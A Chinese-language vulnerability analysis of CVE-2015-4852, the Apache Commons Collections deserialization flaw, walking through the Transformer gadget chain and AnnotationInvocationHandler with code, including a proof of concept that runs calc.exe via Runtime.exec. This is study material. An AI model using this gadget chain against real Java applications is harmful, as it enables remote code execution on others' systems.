# 反序列化漏洞 CVE-2015-4852

## 漏洞概述

​	主要是org.apache.commons.collections存在潜在的远程代码执行漏洞，应用的是java的反序列化部分机制的问题。在Java反序列化中，对于传入的序列化数据没有进行安全性检查，将恶意的TransformedMap序列化，可能会导致远程命令执行。



## 基本信息

​	org.apache.commons.collections 是一个java的集成框架，是对java.util的扩展封装。在使用这个库的时候，会产生远程代码执行危险。

​	Java的反序列化与序列化操作存在隐含的危险，反序列化时需要从文件中读取数据还原成类，因此会调用readObject函数。java在反序列化时，会先调用被序列化类重写的readObject方法。也就是说，如果我们构造的恶意的类对象，其中的readObject函数中存在危险操作就可以执行。这个漏洞就是使用org.apache.commons.collections中的几个函数通过这种方式来进行payload构造。



## PAYLOAD

```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.Method;
import java.util.*;


public class TranformerDemo {

    public static void main(String[] args){

        ChainedTransformer chain = null;
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer( Runtime.class ),
                new InvokerTransformer( "getMethod", new Class[]{ String.class, Class[].class},
                        new Object[]{ "getRuntime", null} ),
                new InvokerTransformer( "invoke", new Class[]{ Object.class, Object[].class },
                        new Object[]{ null, null}),
                new InvokerTransformer( "exec", new Class[]{ String.class},
                        new Object[] { "calc.exe" }) };
        chain = new ChainedTransformer( transformers );

        Map m = new HashMap();
        m.put( "1", "1" );
        Map map = TransformedMap.decorate(m, null, chain );
        map.put( "a", "b" );

    }
}
```

实际我们想要执行的命令就是：

```
((Runtime)Runtime.class.getMethod( "getRuntime", null) .invoke( null, null )).exec( "cal.exe" );
```

​	代码里提到了几个关键类，TransformedMap、InvokerTransformer、ChainedTransformer、ConstantTransformer、Transformer。下边会进行仔细的介绍。



## Transformer

​	org.apache.commons.collections.Transformer类，是其他几个类的父类，主要用于从一个对象变为另一个对象。

```
import org.apache.commons.collections.Transformer;

public class TranformerDemo {
    public static void main(String[] args){
        Transformer tran = new Transformer() {
            public Object transform(Object input) {
                System.out.println( input.getClass() );  
                //class java.lang.Class
                return null;
            }
        };
        tran.transform( Runtime.class );//主要
    }
}
```



## ConstantTransformer 通过转换获得内部类的对象类型

```
public class ConstantTransformer<I, O> implements Transformer<I, O>, Serializable {

    public static final Transformer NULL_INSTANCE = new ConstantTransformer<Object, Object>(null);

    private final O iConstant;

    public static <I, O> Transformer<I, O> constantTransformer(final O constantToReturn) {
        if (constantToReturn == null) {
            return nullTransformer();
        }
        return new ConstantTransformer<I, O>(constantToReturn);
    }

    public ConstantTransformer(final O constantToReturn) {
        super();
        iConstant = constantToReturn;
    }

    public O transform(final I input) {
        return iConstant;  //重写了Transformer的transform方法
    }
```

​	方法transform返回的是 iConstant 变量， iConstant 变量必定在 ConstantTransformer(Object) 方法中被重新赋值了。

​	ConstantTransformer类通过transform方法转换得到内部类的对象类型，例如：参数为Runtime.class时，经过ConstantTransformer执行后返回 java.lang.Runtime。

```
ConstantTransformer tran = new ConstantTransformer( Runtime.class );
//通过调试可以发现，在内部完成了对Runtime的对象类型构造。
```



## InvokerTransformer 通过反射创建新的对象实例

```
public InvokerTransformer(final String methodName, final Class<?>[] paramTypes, final Object[] args) {
    super();
    iMethodName = methodName;
    iParamTypes = paramTypes != null ? paramTypes.clone() : null;
    iArgs = args != null ? args.clone() : null;
}

public O transform(final Object input) {//通过反射创建一个新的对象实例
    
    final Class<?> cls = input.getClass();//获取到传进来的input对象值，就是Runtime对象
    final Method method = cls.getMethod(iMethodName, iParamTypes);//Method方法对象的名字以及函数的参数
    return (O) method.invoke(input, iArgs);//将获取的方法和参数进行执行
}
```

​	构造函数将 iMethodName 和 iParamTypes 的值传递进来，然后在 transform 方法中通过反射的方法，得到了这个方法的对象，最后返回的是Method对象。

```
InvokerTransformer tran = new InvokerTransformer( "getMethod", new Class[]{
            String.class, Class[].class}, new Object[]{
            "getRuntime", null} );
System.out.println( tran.transform( Runtime.class ).toString() );
//输出：public static java.lang.Runtime
//第一个参数是传进来的getMethod方法，
//第二个参数是getMethod方法的参数列表（String.class, Class[].class）
//第三个参数是需要反射的方法以及其执行的参数列表，这里就是getRuntime方法，以及参数null。
```

​	理解了一下InvokerTranformer类之后就是构造反射链的过程了。

```
//构造 Runtime.getRuntime().exec("calc.exe") 的过程
InvokerTransformer tran = new InvokerTransformer( "getMethod", new Class[]{
    String.class, Class[].class}, new Object[]{
    "getRuntime", null} );
    
//获得反射的GetRuntime()方法
Method method = (Method) tran.transform( Runtime.class );
//java.lang.Runtime.getRuntime()输出的是一个类

//invoke反射过程，将GetRuntime反射成对象，只有对象才能调用exec函数。
InvokerTransformer tran2 = new InvokerTransformer( "invoke", new Class[]{
    Object.class, Object[].class }, new Object[]{
    null, null} );
//获得Runtime的对象
Runtime run = (Runtime) tran2.transform( method );

//进行exec("calc.exe")的构造
InvokerTransformer tran3 = new InvokerTransformer( "exec", new Class[]{
    String.class}, new Object[]{
    "calc.exe"} );
tran3.transform( run );
```



## ChainedTransformer 反射链的构造

```
//就是利用了for循环，将transformers[i]运行了transform方法。
public T transform(T object) {
    for (final Transformer<? super T, ? extends T> iTransformer : iTransformers) {
        object = iTransformer.transform(object);
    }
    return object;
}
```

利用ChainedTransformer类进行反射链的构造。

```
ChainedTransformer chain = null;
Transformer[] transformers = new Transformer[] { 
		new ConstantTransformer( Runtime.class ),
    	new InvokerTransformer( "getMethod", new Class[]{ String.class, Class[].class},new Object[]{ "getRuntime", null} ),
        new InvokerTransformer( "invoke", new Class[]{ Object.class, Object[].class },new Object[]{ null, null}),
        new InvokerTransformer( "exec", new Class[]{ String.class}, new Object[] { "calc.exe" }) };

chain = new ChainedTransformer( transformers );
chain.transform( Object.class );
```

​	反射链有了，那么如何让反射链进行执行呢，又是怎么跟反序列化联系在一起的呢。就用到了TransformedMap。



## TransformedMap

​	对Java标准数据结构Map接口的一个扩展，该类可以在一个元素被加到集合内时，自动的对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap进行实例化时作为参数传入。

​	可以通过TransformedMap.decorate()方法 ，来获得一个TransformedMap实例。

```
Map map = TransformedMap.decorate(map, keyTransformer,  valueTransformer);
```

​	当key或者value发生变化时，就会触发相应的Transfromer的transfrom()的方法。另外，可以使用之前提到的ChainedTransformer。触发时，ChainedTransformer可以按照顺序调用一系列的变换。**也就是说这里的valueTransformer可以进行人为的构造为之前的payload，使其可以进行远程代码执行。**

- 我们再看一下对于反序列化漏洞的描述：

  ​	在Java反序列化中，对于传入的序列化数据进行安全性检查，将恶意的TransformedMap序列化，可能会导致远程命令执行。如何使应用触发Transformer变换呢：我们在反序列化的时候，会调用被反序列化的readObject方法。那么如果某个可序列化的类重写了readObject方法，并且对变量进行了键值修改的操作，这个Map变量是可控的就可能实现攻击。

## AnnotationInvocationHandler

```
class AnnotationInvocationHandler implements InvocationHandler, Serializable {
    private final Class<? extends Annotation> type;
    private final Map<String, Object> memberValues;

    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
        this.type = type;
        this.memberValues = memberValues;
    }
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }
}
```

​	这个类，满足了需要的可序列化、有memberValue为Map类型变量并可控、还有memberValue.setValue的操作。我们只需要实例化一个AnnotationInvocation类，并将其成员变量memberValue设为我们精心构造的TransformedMap对象，然后将其进行序列化，提交给应用。应用在进行反序列化的时候就可以进行远程代码执行了。

​	后边就是具体的攻击过程了。https://www.anquanke.com/post/id/173459

